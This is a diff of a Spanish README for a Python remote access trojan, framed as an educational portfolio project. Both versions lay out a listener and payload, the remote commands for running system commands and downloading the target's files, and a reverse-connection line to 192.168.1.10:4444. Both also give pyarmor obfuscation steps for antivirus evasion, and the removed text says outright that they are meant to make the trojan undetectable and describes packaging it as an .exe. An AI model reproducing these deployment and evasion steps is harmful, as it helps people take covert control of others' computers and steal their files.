@@ -1,60 +1,106 @@
-# Troyano
+# 🛡️ Troyano en Python (Educativo)
 
-<p align="center">
-  <img src="./Img/Logo.png" height="300px" width="350px">
-</p>
+![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white)
+![GitLab](https://img.shields.io/badge/GitLab-Repository-orange?logo=gitlab)
+![Status](https://img.shields.io/badge/Status-Stable-brightgreen)
+![Educational](https://img.shields.io/badge/Purpose-Educational%20Only-blue)
+![Warning](https://img.shields.io/badge/⚠-Authorized%20Use%20Only-red)
 
-Un **troyano** es un tipo de software malicioso que se disfraza de una aplicación legítima para engañar a los usuarios y obtener acceso no autorizado a sus sistemas. Este proyecto está diseñado únicamente con fines **educativos y de investigación en ciberseguridad**.
+## 🔍 Descripción del Proyecto
 
----
+Este repositorio contiene una implementación básica de un Troyano de Acceso Remoto (RAT) en Python, diseñado estrictamente con **fines educativos** y para **investigación en análisis de malware**. Demuestra los conceptos fundamentales de la arquitectura Cliente-Servidor utilizada en frameworks C2 (Comando y Control).
 
-## ⚙️ Instalación
+Este proyecto forma parte de un portafolio de ciberseguridad que demuestra comprensión de:
+- 📡 Programación de Sockets (TCP/IP)
+- 💻 Ejecución Remota de Comandos
+- 📂 Manipulación del Sistema de Archivos
+- 🛡️ Técnicas de Evasión y Ofuscación (aplicación teórica)
 
-Descarga el repositorio y configura el script `troyano.py` con tu IP pública para establecer la conexión remota:
+## ⚠️ Aviso Legal y Ético
 
-```python
-conexion.connect(("192.168.1.10", 4444))
+> [!IMPORTANT]
+> **Esta herramienta es SOLO PARA FINES EDUCATIVOS.**
+>
+> El autor no aprueba el uso de este software para fines maliciosos. El uso de estas herramientas para atacar objetivos sin el consentimiento mutuo previo es ilegal. Es responsabilidad del usuario final obedecer todas las leyes locales, estatales y federales aplicables. Los desarrolladores no asumen ninguna responsabilidad y no son responsables de ningún mal uso o daño causado por este programa.
+
+## 🏗️ Arquitectura del Proyecto
+
+El proyecto está estructurado siguiendo estándares profesionales de DevSecOps:
+
+```text
+/
+├── configs/          # Plantillas de configuración
+├── scripts/          # Scripts de automatización y construcción
+├── src/
+│   ├── payload/      # Payload del lado del cliente (Objetivo)
+│   └── server/       # Listener del lado del servidor (Atacante)
+├── tests/            # Pruebas unitarias y de seguridad
+└── README.md         # Documentación
 ```
 
----
+### Componentes
+1. **Servidor (C2)**: Escucha conexiones entrantes y emite comandos.
+2. **Payload (Bot)**: Se conecta al servidor y ejecuta las instrucciones recibidas.
 
-## 🔒 Ofuscación
+## 🚀 Comenzando (Entorno de Laboratorio)
 
-Para hacer indetectable el troyano, instala **pyarmor**:
+### Requisitos Previos
+- Python 3.8+
+- Entorno Virtual (recomendado)
+
+### Instalación
+
+1. Clonar el repositorio:
+   ```bash
+   git clone https://gitlab.com/tu-usuario/troyano.git
+   cd troyano
+   ```
+
+2. Configurar entorno:
+   ```bash
+   python -m venv venv
+   source venv/bin/activate  # Windows: venv\Scripts\activate
+   pip install -r requirements.txt # (si aplica)
+   ```
+
+3. Configurar Conexión:
+   Edita `configs/config.yaml` o modifica la dirección IP en `src/payload/troyano.py` para que apunte a tu listener.
+
+### Uso
+
+1. **Iniciar el Listener:**
+   ```bash
+   python src/server/server.py
+   ```
+
+2. **Ejecutar Payload (en VM/Objetivo):**
+   ```bash
+   python src/payload/troyano.py
+   ```
+
+3. **Comandos Disponibles:**
+   - `cd <ruta>`: Cambiar directorio
+   - `download <archivo>`: Descargar archivo del objetivo
+   - `<cmd>`: Ejecutar comando del sistema (ej. `dir`, `whoami`)
+   - `exit`: Cerrar conexión
+
+## 🧪 Pruebas y CI/CD
+
+Este proyecto utiliza **GitLab CI/CD** para pruebas automatizadas y análisis de seguridad.
+- **Pruebas Unitarias**: Verifica la lógica de conexión (mocked).
+- **SAST**: Pruebas de Seguridad de Aplicaciones Estáticas usando `bandit` para identificar vulnerabilidades en el código.
+
+Para ejecutar pruebas localmente:
+```bash
+python -m unittest discover tests/
+```
+
+## 🔐 Ofuscación (investigación red team)
+
+Para la investigación sobre evasión de AV, el payload puede ser ofuscado usando `pyarmor`.
+*Nota: Las técnicas detalladas de ofuscación están reservadas para el repositorio privado de GitLab.*
 
 ```bash
-pip install pyarmor
+# Ejemplo de comando
+pyarmor gen src/payload/troyano.py
 ```
-
-Ofusca el script:
-
-```bash
-pyarmor gen troyano.py
-```
-
-Esto generará una carpeta `Dist` con el troyano ofuscado.  
-Luego convierte el archivo `.py` a `.exe` con **auto-py-to-exe**:
-
-```bash
-pip install auto-py-to-exe
-```
-
----
-
-## ▶️ Uso
-
-Ejemplo de comando disponible:
-
-```bash
-download <nombre de archivo>
-```
-
-<p align="center">
-  <img src="./Img/virustotal.png">
-</p>
-
----
-
-## ⚠️ Aviso legal
-
-Este script ha sido desarrollado únicamente con fines **educativos y de investigación en ciberseguridad**. El uso indebido de este material puede ser **ilegal**. No me responsabilizo del mal uso ni de los daños que puedan ocasionarse por su ejecución.
